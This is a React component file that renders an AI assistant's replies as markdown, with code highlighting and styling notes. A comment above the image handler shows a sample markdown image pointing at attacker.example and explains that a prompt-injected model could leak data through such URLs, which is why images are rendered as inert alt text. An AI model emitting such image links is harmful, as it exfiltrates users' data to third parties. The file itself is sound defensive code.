"use client";
// Renders an assistant reply as markdown instead of a plain string, so
// headings, lists and prose get real line-height and sizing and a fenced code
// block gets a monospace, per-language syntax highlighter instead of a plain
// `<pre>`. Streamdown is the one place that config lives. A reply still
// streaming in (`assistant-stream-reply.tsx`) passes `streaming: true`, so an
// unterminated fence or bold marker never renders as broken HTML mid-reply
// (`parseIncompleteMarkdown`).
import { Streamdown } from "streamdown";
import { createCodePlugin } from "@streamdown/code";

/**
 * Shiki highlighting for fenced code. `[light, dark]` emits both themes as
 * inline `--shiki-light`/`--shiki-dark` CSS variables and Streamdown's
 * `dark:` Tailwind utilities pick between them off the `.dark` class on
 * `<html>`, with no JS theme detection and no flash.
 */
const codePlugin = createCodePlugin({
  themes: ["github-light", "github-dark"],
});

/**
 * An image in a reply renders as its alt text and is never fetched. The reply
 * is model output, and a prompt injection or a tool result can steer it: an
 * `![x](https://attacker.example/?d=…)` would otherwise have the browser send
 * whatever the model put in that URL to a third party, with no confirmation.
 * Streamdown's link-safety prompt covers links, not images.
 */
function InertImage({ alt }: { alt?: string }) {
  return alt ? <span>{alt}</span> : null;
}

/**
 * `text-sm` alone: its own line-height (1.25rem) matches the user bubble and
 * the intro copy beside a reply. `leading-relaxed` on top made every paragraph
 * and list item a taller line than the rest of the flyout. Streamdown keeps
 * `space-y-4` between blocks, which is the paragraph spacing this keeps.
 *
 * Streamdown gives each `<li>` `py-1`, so sibling items sat 8px apart on top
 * of the line-height. Halved, a list reads as one block, not a stack of
 * paragraphs.
 */
const PROSE_CLASS =
  "max-w-none text-sm [&>*:first-child]:mt-0 [&>*:last-child]:mb-0 [&_li]:py-0.5 [&_pre]:max-w-full [&_pre]:overflow-x-auto [&_table]:block [&_table]:max-w-full [&_table]:overflow-x-auto";

const COMPONENTS = { img: InertImage };

export interface AssistantMarkdownProps {
  children: string;
  /** True while the reply is still streaming in (see `assistant-stream-reply.tsx`). */
  streaming?: boolean;
}

export function AssistantMarkdown({
  children,
  streaming = false,
}: AssistantMarkdownProps) {
  return (
    <Streamdown
      parseIncompleteMarkdown={streaming}
      shikiTheme={["github-light", "github-dark"]}
      components={COMPONENTS}
      plugins={{ code: codePlugin }}
      controls={{ code: { copy: true, download: false } }}
      className={PROSE_CLASS}
    >
      {children}
    </Streamdown>
  );
}
